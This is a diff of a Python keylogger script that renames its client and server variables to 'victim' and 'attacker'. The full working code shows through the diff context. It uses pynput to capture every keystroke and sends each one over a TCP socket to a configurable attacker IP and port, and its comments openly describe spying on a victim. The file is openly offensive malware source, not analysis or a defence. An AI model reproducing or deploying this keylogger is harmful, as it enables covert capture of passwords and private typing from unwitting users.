@@ -2,13 +2,13 @@ from pynput import keyboard                     # pynput libray is used to monit
 
 import socket                                   # socket library is used to establish the connection between the client(victim) and server(attacker)
 
-server_address=('192.1.1.1',8000)               # change ip address of server/attacker
+attacker_address=('192.1.1.1',8000)               # change ip address of server/attacker
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
+victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
                                                 
 # AF_INET for ipv4 and SOCK_STREAM for TCP connection (SOCK_DGRAM for UDP connection)
 
-client_socket.connect(server_address)
+victim_socket.connect(attacker_address)
 def press(key):                                 # function to monitor the key press event
     try:
         print(" clicked {}",format(key.char))   # to print which key is pressed only if it is a character(alphanumeric)
@@ -18,14 +18,14 @@ def press(key):                                 # function to monitor the key pr
         
 def release(key):
     if key == keyboard.Key.esc:                 # if the key pressed is escape key then close the connection
-        client_socket.close()
+        victim_socket.close()
         return False
     else:                                       # else send the key pressed to the attacker
         try:
             message=str(key.char)
         except AttributeError:                  # AttributeError is raised when the key pressed is a special character or symbol
             message=str(key)
-        client_socket.sendall(message.encode('utf-8'))  # send the key pressed to the attacker in utf-8 (encoded) format
+        victim_socket.sendall(message.encode('utf-8'))  # send the key pressed to the attacker in utf-8 (encoded) format
        
 with keyboard.Listener(on_press=press, on_release=release) as listener:
     listener.join()                                         # start the listener to monitor the key press and release events
